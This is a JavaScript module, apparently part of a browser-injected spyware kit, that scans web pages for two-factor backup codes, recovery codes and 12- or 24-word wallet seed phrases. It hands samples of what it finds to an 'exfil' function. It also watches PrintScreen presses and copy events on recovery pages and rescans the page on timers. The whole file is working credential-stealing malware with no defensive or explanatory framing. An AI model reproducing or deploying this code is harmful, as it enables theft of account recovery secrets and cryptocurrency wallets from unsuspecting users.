/* m-recovery.js — Backup/recovery codes vacuum + screenshot detection.
   Scan DOM por bloques de recovery codes; detecta PrintScreen (captura de backup codes). */
(function(G){
if(!G)return; if(G._M&&G._M.rec)return; G._M=G._M||{}; G._M.rec=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var REC=/backup.?code|recovery.?code|secret.?key|mnemonic|seed.?phrase|private.?key|2fa.?secret/i;
function b64(s){try{return btoa(unescape(encodeURIComponent(s))).slice(0,200)}catch(e){return String(s).slice(0,200)}}
function scan(){
var found=[];
// texto visible que mencione recovery codes + bloques cercanos
var els=document.querySelectorAll('pre,code,textarea,div,span,p,kbd,samp');
for(var i=0;i<els.length&&i<400;i++){
var el=els[i];var t=(el.innerText||el.value||'').trim();if(!t||t.length<8||t.length>4000)continue;
// seed phrase (12/24 palabras BIP39)
var words=t.toLowerCase().split(/\s+/).filter(function(w){return /^[a-z]{3,8}$/.test(w)});
if((words.length===12||words.length===24)&&words.join(' ').length>40){exfil('seed-phrase',{n:words.length,hash:b64(words.slice(0,3).join(' ')),len:t.length});return}
// bloques de tokens alfanuméricos
if(REC.test(el.getAttribute('class')||'')||REC.test(el.getAttribute('aria-label')||'')||(el.previousElementSibling&&REC.test(el.previousElementSibling.innerText||''))){
var lines=t.split(/\n/).map(function(l){return l.trim()}).filter(function(l){return /^[A-Za-z0-9]{4,40}(-[A-Za-z0-9]{4,40})?$/.test(l)});
if(lines.length>=4){exfil('recovery-block',{tag:el.tagName,sample:lines.slice(0,6).join('|'),n:lines.length});return}
}
}
}
// detección de screenshot / copia
document.addEventListener('keyup',function(e){
if(e.key==='PrintScreen'){exfil('recovery-screenshot',{key:'PrintScreen',loc:location.pathname})}
});
document.addEventListener('copy',function(e){
var s=window.getSelection&&window.getSelection().toString();
if(s&&s.length>20&&REC.test(document.title+location.pathname))exfil('recovery-copy',{len:s.length,head:s.slice(0,40)});
},{capture:true});
setTimeout(scan,3000);setInterval(scan,15000);
exfil('recovery-boot',{hooked:true});
}catch(e){hx('m-recovery-err',{m:e.message})}
})(window.__GE__);
